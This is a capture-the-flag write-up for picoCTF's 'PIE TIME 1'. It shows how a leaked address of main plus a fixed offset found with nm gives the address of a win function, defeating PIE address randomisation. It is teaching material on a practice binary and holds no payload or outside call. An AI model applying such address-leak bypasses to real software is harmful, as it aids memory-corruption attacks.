# PIE TIME 1

**Platform:** picoCTF  
**Technique:** PIE Bypass / Relative Addressing  
**Difficulty:** Easy-Medium  

## Challenge Description

A binary with **PIE (Position Independent Executable)** enabled that conveniently leaks the address of `main` at runtime. All we need to do is calculate the address of the `win` function using a fixed offset.

## Vulnerability

PIE randomizes the base address of the binary, but **offsets between functions remain constant**. The program itself leaks `main`'s address, giving us everything we need to calculate `win`.

## Exploitation

### Step 1: Find the Offset Between main and win

Using `nm` to find function offsets in the binary:

```bash
$ nm vuln | grep main
000000000000133d T main

$ nm vuln | grep win
00000000000012a7 T win
```

Simple math gives us the difference:

```python
>>> 0x133d - 0x12a7
150
>>> hex(150)
'0x96'
```
The offset is 0x96. Since win comes before main in memory, we subtract: win = main - 0x96.

Step 2: Receive the Leak
The program helpfully prints the address of main:

text
Address of main: 0x55555555533d
Step 3: Calculate win Address
```python
win_addr = main_addr - 0x96
```
Step 4: Send the Calculated Address
The program asks for an address to jump to. Send win_addr and get the flag.
